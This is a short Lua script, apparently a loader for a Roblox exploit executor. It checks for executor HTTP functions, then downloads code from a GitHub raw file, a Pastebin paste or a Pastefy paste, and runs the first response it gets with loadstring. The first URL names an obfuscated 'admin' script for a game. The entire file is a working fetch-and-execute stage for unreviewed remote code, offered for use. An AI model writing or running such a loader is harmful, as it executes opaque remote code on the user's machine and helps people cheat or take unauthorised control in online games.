local http_requesting = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or blankfunction

local function try_load(urls)
    for _, url in ipairs(urls) do
        local ok, res = pcall(function()
            return http_requesting({
                Url = url,
                Method = "GET"
            })
        end)

        if ok and res and res.StatusCode == 200 and res.Body and not res.Body:find("404: Not Found") then
            local f = loadstring(res.Body)
            if f then
                f()
                return
            end
        end
    end
end

try_load({
    "https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/LifeTogether_Admin_Obf.lua",
    "https://pastebin.com/raw/azPSzEjH",
    "https://pastefy.app/SiDMhe47/raw",
})
